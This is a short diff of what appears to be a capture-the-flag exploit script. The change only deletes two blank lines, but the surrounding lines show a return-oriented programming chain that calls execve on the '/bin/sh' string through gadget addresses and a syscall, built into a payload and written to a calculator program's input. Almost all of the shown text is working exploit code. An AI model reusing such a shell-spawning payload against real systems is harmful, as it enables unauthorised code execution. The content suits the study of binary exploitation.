@@ -42,7 +42,6 @@ nop = "1\n2425392062\n1234\n"
 #0x0
 zero = "2\n1234\n1234\n"
 
-
 #ROP Chain -- execve(0x6c2c40, 0, 0)
 #pop rdx,ret
 #0x68732f6e69622f
@@ -96,7 +95,6 @@ payload += zero
 payload += c(0x4648e5)    
 payload += zero           #syscall
 payload += "5\n"
-
 
 readuntil(f, 'Expected number of calculations: ')
 f.write(payload)
